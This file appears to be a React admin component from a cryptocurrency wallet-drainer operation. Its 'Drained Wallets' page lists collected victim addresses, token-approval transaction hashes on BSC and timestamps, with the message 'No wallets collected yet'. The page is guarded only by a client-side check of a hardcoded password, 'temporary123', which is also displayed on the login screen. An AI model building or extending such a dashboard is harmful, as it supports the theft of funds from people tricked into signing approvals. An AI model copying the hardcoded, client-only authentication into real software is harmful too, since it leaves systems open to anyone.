"use client";

import { useState, useEffect } from "react";
import { Lock, Loader2, LogOut } from "lucide-react";

const ADMIN_PASSWORD = "temporary123"; // Change this after first use

export default function SimpleAdmin() {
  const [password, setPassword] = useState("");
  const [isLoggedIn, setIsLoggedIn] = useState(false);
  const [wallets, setWallets] = useState<any[]>([]);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");

  // Check if already logged in
  useEffect(() => {
    if (typeof window !== "undefined" && sessionStorage.getItem("admin_logged_in") === "true") {
      setIsLoggedIn(true);
      fetchWallets();
    }
  }, []);

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    if (password === ADMIN_PASSWORD) {
      setIsLoggedIn(true);
      sessionStorage.setItem("admin_logged_in", "true");
      fetchWallets();
    } else {
      setError("Wrong password");
    }
  };

  const fetchWallets = async () => {
    setLoading(true);
    setError("");
    try {
      const res = await fetch("/api/wallets");
      if (!res.ok) throw new Error("Failed to fetch");
      const data = await res.json();
      setWallets(data.wallets || data || []);
    } catch (err) {
      setError("Failed to load wallets. Make sure table exists.");
      console.error(err);
    } finally {
      setLoading(false);
    }
  };

  const handleLogout = () => {
    sessionStorage.removeItem("admin_logged_in");
    setIsLoggedIn(false);
    setWallets([]);
  };

  if (!isLoggedIn) {
    return (
      <div className="min-h-screen bg-[#0a0a0a] flex items-center justify-center p-4">
        <div className="max-w-sm w-full bg-[#111] border border-gray-800 rounded-3xl p-8">
          <div className="flex justify-center mb-6">
            <div className="bg-gray-800 p-4 rounded-full">
              <Lock className="h-8 w-8 text-gray-400" />
            </div>
          </div>
          <h1 className="text-2xl font-bold text-center mb-2">Admin Login</h1>
          <p className="text-gray-500 text-center mb-8">Enter password to access control panel</p>

          <form onSubmit={handleLogin}>
            <input
              type="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              placeholder="Enter password"
              className="w-full bg-[#1c1c1c] border border-gray-700 rounded-2xl px-5 py-4 text-white mb-4 focus:outline-none focus:border-[#4ade80]"
            />
            <button
              type="submit"
              className="w-full bg-[#4ade80] text-black font-bold py-4 rounded-2xl hover:bg-[#22c55e] transition"
            >
              Login
            </button>
          </form>

          {error && <p className="text-red-400 text-center mt-4">{error}</p>}
          <p className="text-center text-xs text-gray-600 mt-6">
            Default Password: <span className="text-gray-400">temporary123</span>
          </p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#0a0a0a] text-white p-4">
      <div className="max-w-5xl mx-auto">
        <div className="flex justify-between items-center mb-8">
          <h1 className="text-3xl font-bold">Drained Wallets</h1>
          <button onClick={handleLogout} className="flex items-center gap-2 text-red-400 hover:text-red-500">
            <LogOut className="h-5 w-5" /> Logout
          </button>
        </div>

        {loading ? (
          <div className="flex justify-center py-12">
            <Loader2 className="h-8 w-8 animate-spin" />
          </div>
        ) : error ? (
          <p className="text-red-400 text-center">{error}</p>
        ) : wallets.length === 0 ? (
          <p className="text-center text-gray-500 py-12">No wallets collected yet.</p>
        ) : (
          <div className="bg-[#111] rounded-3xl overflow-hidden border border-gray-800">
            <table className="w-full">
              <thead>
                <tr className="border-b border-gray-800">
                  <th className="text-left p-5">Wallet Address</th>
                  <th className="text-left p-5">Tx Hash</th>
                  <th className="text-left p-5">Time</th>
                </tr>
              </thead>
              <tbody>
                {wallets.map((w: any, i) => (
                  <tr key={i} className="border-b border-gray-800 hover:bg-[#1a1a1a]">
                    <td className="p-5 font-mono text-sm break-all">{w.address}</td>
                    <td className="p-5 font-mono text-sm">
                      {w.approvalTxHash ? (
                        <a href={`https://bscscan.com/tx/${w.approvalTxHash}`} target="_blank" className="text-blue-400 hover:underline">
                          {w.approvalTxHash.slice(0, 12)}...
                        </a>
                      ) : "-"}
                    </td>
                    <td className="p-5 text-gray-500 text-sm">
                      {w.created_at ? new Date(w.created_at).toLocaleString() : "-"}
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        )}
      </div>
    </div>
  );
}